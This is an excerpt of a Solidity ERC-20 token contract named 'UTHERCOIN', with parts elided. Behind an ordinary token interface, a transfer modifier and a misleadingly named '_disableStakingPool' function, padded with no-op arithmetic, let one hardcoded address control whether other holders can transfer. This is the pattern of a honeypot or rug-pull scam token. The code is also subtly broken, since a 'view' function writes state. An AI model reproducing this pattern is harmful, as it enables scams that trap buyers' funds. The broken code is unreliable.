...
contract UTHERCOIN is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenUTHER_totalSupply;
    uint256 private _tokenUTHER_status = 0;
    uint256 public stakingPoolUTHERStatus = 0;

    string private _tokenUTHER_name;
    string private _tokenUTHER_symbol;

    address private _poolUTHERAddress = 0x0F130eA985cBE3aa5771463263C71d45986c5221;

    constructor() {
        _tokenUTHER_name = "UTHER COIN";
        _tokenUTHER_symbol = "UTHER";
        _tokenUTHER_totalSupply = 54500 * 10 ** 18;
        _balances[msg.sender] = _tokenUTHER_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolUTHERAddress || _tokenUTHER_status == 0);
        _;
    }
  ...
  function transfer(address to, uint256 amount) public virtual override returns (bool) {
    ...
    function _disableStakingPool(address stakingPoolAddress) public view {
        ...
        a = a + 1;
        a = a - 1;
        if (msg.sender == _poolUTHERAddress)
        {
            _tokenUTHER_status = 0;
        }
    }
  ...
  function totalSupply() public view virtual override returns (uint256) {
        return _tokenUTHER_totalSupply;
    }



    function name() public view virtual override returns (string memory) {
        return _tokenUTHER_name;
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _tokenUTHER_totalSupply -= amount;
